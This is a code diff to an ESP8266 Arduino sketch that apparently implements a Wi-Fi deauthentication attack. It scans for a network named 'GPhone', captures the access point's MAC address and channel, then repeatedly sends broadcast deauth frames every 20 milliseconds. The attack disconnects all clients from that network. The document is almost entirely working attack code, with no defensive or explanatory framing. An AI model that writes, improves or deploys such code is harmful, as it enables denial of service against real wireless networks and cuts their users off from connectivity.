@@ -4,43 +4,54 @@
 
 uint8_t numNetworks = 0;
 uint32_t *knownMACS[NUMNET];
+bool found;
+uint8_t* targetMAC;
+uint8_t packetSize;
+
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00, // Frame Control
+  0x3A, 0x01, // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
+  0x00, 0x00, // Fragment & Sequence number
+  0x01, 0x00  // Reason code 1 (no reason given)
+};
 
 void setup() {
-  Serial.begin(9600);
+  Serial.begin(115200);
   Serial.println();
   Serial.println("Deauthing GPhone");
+  found = false;
 
   // Set WiFi to station mode and disconnect from any AP
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
+
+  packetSize = sizeof(deauthPacket);
 }
 
 void loop() {
-  findNewNetworks();
-  delay(5000);
+  if(!found){findNewNetworks();}
+  else{
+    Serial.println("Deauthing...");
+    deauthAttack(targetMAC);
+  }
+  
+  delay(20);
 }
 
-void deauthAttack(uint8_t* apMac, uint8_t channel) {
-  Serial.println("Deauthing...");
-  uint8_t packet[26] = {
-    0xC0, 0x00, // Frame Control
-    0x3A, 0x01, // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
-    0x00, 0x00, // Fragment & Sequence number
-    0x01, 0x00  // Reason code 1 (no reason given)
-  };
+void deauthAttack(uint8_t* apMac) {
+  uint8_t newPacket[packetSize];
+  memcpy(newPacket, deauthPacket, packetSize);
 
-  wifi_set_channel(channel);//same chanel as
-
-  memcpy(&packet[10], apMac, 6);
-  memcpy(&packet[16], apMac, 6);
+  memcpy(&newPacket[10], apMac, 6);
+  memcpy(&newPacket[16], apMac, 6);
 
   for (int i = 0; i < 5; i++) {
-    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
-    delay(100);  // Adjust delay as needed
+    if(wifi_send_pkt_freedom(newPacket, 26, 0) != 0){Serial.print(".");}
+    delay(20);  // Adjust delay as needed
   }
 }
 void findNewNetworks(){
@@ -59,13 +70,16 @@ void findNewNetworks(){
     }
 
     if(newNetwork){
-      String ssid = WiFi.SSID(i);
-      if(ssid == "GPhone"){
+      if(WiFi.SSID(i) == "GPhone"){
         Serial.println("Network found");
         Serial.printf("Mac Address: %s\n", WiFi.BSSIDstr(i));
         Serial.printf("Wifi Channel: %d\n", WiFi.channel(i));
 
-        deauthAttack(WiFi.BSSID(i), WiFi.channel(i));
+        found = true;
+        targetMAC = WiFi.BSSID(i);
+        wifi_set_channel(WiFi.channel(i));//same channel as target AP
+        
+        break;
       }
     }
   }
